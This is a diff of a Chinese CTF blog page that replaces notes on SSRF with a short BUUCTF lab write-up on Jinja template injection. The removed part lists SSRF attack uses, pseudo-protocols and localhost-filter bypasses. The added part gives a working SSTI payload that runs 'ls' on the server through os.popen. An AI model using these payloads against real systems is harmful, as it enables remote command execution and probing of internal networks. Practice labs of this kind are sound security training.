@@ -16,21 +16,21 @@
   <meta name="author" content="x0candy">
   <meta name="keywords" content="">
   
-    <meta name="description" content="SSRFssrf名服务器请求伪造 一般表现形式就是http:&#x2F;&#x2F;xxx.com?url&#x3D;http:&#x2F;&#x2F;xxx.com，参数后面接一个地址 攻击方式： 内网探测，dos攻击（请求大文件，一直保持keep-alive-always），跳板，伪协议读取文件， 利用redis未授权访问，HTTP CRLF注入实现getshell 常用伪协议： 1234561.file:&#x2F;&#x2F;&#x2F;  --本地文件传输协议，主要">
+    <meta name="description" content="SSTI模板注入打开靶场，看到password is wrong 先传参password试一试， 1?password&#x3D;&amp;#123;&amp;#123;7*7&amp;#125;&amp;#125;  回显49，存在模板注入 试一下config，爆出了配置 构造payload读取服务器目录 1?password&#x3D;&amp;#123;&amp;#123;config.__class__.__init__.__globals__[&amp;#x27">
 <meta property="og:type" content="article">
-<meta property="og:title" content="SSRF">
-<meta property="og:url" content="http://example.com/2023/07/14/buuctf/n1book/SSRF/index.html">
+<meta property="og:title" content="SSTI模板注入">
+<meta property="og:url" content="http://example.com/2023/07/15/buuctf/n1book/SSTI/index.html">
 <meta property="og:site_name" content="x0candy">
-<meta property="og:description" content="SSRFssrf名服务器请求伪造 一般表现形式就是http:&#x2F;&#x2F;xxx.com?url&#x3D;http:&#x2F;&#x2F;xxx.com，参数后面接一个地址 攻击方式： 内网探测，dos攻击（请求大文件，一直保持keep-alive-always），跳板，伪协议读取文件， 利用redis未授权访问，HTTP CRLF注入实现getshell 常用伪协议： 1234561.file:&#x2F;&#x2F;&#x2F;  --本地文件传输协议，主要">
+<meta property="og:description" content="SSTI模板注入打开靶场，看到password is wrong 先传参password试一试， 1?password&#x3D;&amp;#123;&amp;#123;7*7&amp;#125;&amp;#125;  回显49，存在模板注入 试一下config，爆出了配置 构造payload读取服务器目录 1?password&#x3D;&amp;#123;&amp;#123;config.__class__.__init__.__globals__[&amp;#x27">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2023-07-14T02:51:03.992Z">
-<meta property="article:modified_time" content="2023-07-14T03:14:16.945Z">
+<meta property="article:published_time" content="2023-07-15T03:57:40.231Z">
+<meta property="article:modified_time" content="2023-07-15T05:46:50.503Z">
 <meta property="article:author" content="x0candy">
 <meta name="twitter:card" content="summary_large_image">
   
   
   
-  <title>SSRF - x0candy</title>
+  <title>SSTI模板注入 - x0candy</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -196,7 +196,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="SSRF"></span>
+            <span id="subtitle" data-typed-text="SSTI模板注入"></span>
           
         </div>
 
@@ -207,8 +207,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2023-07-14 10:51" pubdate>
-          2023年7月14日 上午
+        <time datetime="2023-07-15 11:57" pubdate>
+          2023年7月15日 中午
         </time>
       </span>
     
@@ -219,7 +219,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          688 字
+          304 字
         
       </span>
     
@@ -230,7 +230,7 @@
         
         
         
-          6 分钟
+          3 分钟
         
       </span>
     
@@ -268,25 +268,22 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">SSRF</h1>
+            <h1 style="display: none">SSTI模板注入</h1>
             
             
               <div class="markdown-body">
                 
-                <h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><p>ssrf名服务器请求伪造</p>
-<p>一般表现形式就是<a target="_blank" rel="noopener" href="http://xxx.com/?url=http://xxx.com%EF%BC%8C%E5%8F%82%E6%95%B0%E5%90%8E%E9%9D%A2%E6%8E%A5%E4%B8%80%E4%B8%AA%E5%9C%B0%E5%9D%80">http://xxx.com?url=http://xxx.com，参数后面接一个地址</a></p>
-<p>攻击方式：</p>
-<p>内网探测，dos攻击（请求大文件，一直保持keep-alive-always），跳板，伪协议读取文件，</p>
-<p>利用redis未授权访问，HTTP CRLF注入实现getshell</p>
-<p>常用伪协议：</p>
-<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-number">1</span><span class="hljs-selector-class">.file</span>:<span class="hljs-comment">///  --本地文件传输协议，主要用于访问本地文件</span><br><span class="hljs-number">2</span><span class="hljs-selector-class">.dict</span>:<span class="hljs-comment">///  --字典服务器协议，dict是基于查询相应的tcp协议，服务器监听端口2628</span><br><span class="hljs-number">3</span><span class="hljs-selector-class">.sftp</span>:<span class="hljs-comment">///  --ssh文件传输协议</span><br><span class="hljs-number">4</span><span class="hljs-selector-class">.ldap</span>:<span class="hljs-comment">///  --轻量级目录访问协议。它是IP网络上的一种用于管理和访问分布式目录信息服务的应用程序协议</span><br><span class="hljs-number">5</span><span class="hljs-selector-class">.tftp</span>:<span class="hljs-comment">///  --基于lockstep机制的文件传输协议，允许客户端从远程主机获取文件或将文件上传至远程主机</span><br><span class="hljs-number">6</span>gopher:<span class="hljs-comment">/// --互联网上使用的分布型的文件搜集获取网络协议，出现在http协议之前</span><br></code></pre></td></tr></table></figure>
+                <h1 id="SSTI模板注入"><a href="#SSTI模板注入" class="headerlink" title="SSTI模板注入"></a>SSTI模板注入</h1><p>打开靶场，看到password is wrong</p>
+<p>先传参password试一试，</p>
+<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">?password=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">7</span>*<span class="hljs-number">7</span>&#125;&#125;</span><br></code></pre></td></tr></table></figure>
 
-<p>有时候，ssrf处的参数会进行限制，下面讲一下绕过</p>
-<p>常用绕过：</p>
-<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>.利用xxx.com@<span class="hljs-number">1.1.1.1</span>，例如？url=http://www.baidu.com@<span class="hljs-number">127.0.0.1</span>,这样请求的还是<span class="hljs-number">127.0.0.1</span><br><span class="hljs-attribute">2</span>.ip进制转换，例如http://<span class="hljs-number">2130706433</span>,这个其实就是http://<span class="hljs-number">127.0.0.1</span><br><span class="hljs-attribute">3</span>.短链接，找个短链接生成平台，将payload改成短链接，例如？url=http://<span class="hljs-number">985</span>.so/<span class="hljs-number">22</span>dn0<br><span class="hljs-attribute">4</span>.使用<span class="hljs-number">0.0.0.0</span>或者<span class="hljs-number">0</span>替换<span class="hljs-number">127.0.0.1</span>，即?url=http://<span class="hljs-number">0.0.0.0</span><br></code></pre></td></tr></table></figure>
+<p>回显49，存在模板注入</p>
+<p>试一下config，爆出了配置</p>
+<p>构造payload读取服务器目录</p>
+<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">?password=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">config.__class__.__init__.__globals__</span>[&#x27;os&#x27;].popen(<span class="hljs-name">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><br></code></pre></td></tr></table></figure>
 
-
-
+<p>读取到了服务器目录，有一个app目录，目录里有docker文件和源码server.py</p>
+<p>读取server.py，flag在里面</p>
 
                 
               </div>
@@ -325,8 +322,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>SSRF</div>
-      <div>http://example.com/2023/07/14/buuctf/n1book/SSRF/</div>
+      <div>SSTI模板注入</div>
+      <div>http://example.com/2023/07/15/buuctf/n1book/SSTI/</div>
     </div>
     <div class="license-meta">
       
@@ -338,7 +335,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2023年7月14日</div>
+          <div>2023年7月15日</div>
         </div>
       
       
@@ -370,18 +367,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2023/07/15/buuctf/n1book/SSTI/" title="SSTI模板注入">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">SSTI模板注入</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2023/07/13/buuctf/n1book/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" title="文件上传">
-                        <span class="hidden-mobile">文件上传</span>
+                      <a href="/2023/07/14/buuctf/n1book/SSRF/" title="SSRF">
+                        <span class="hidden-mobile">SSRF</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
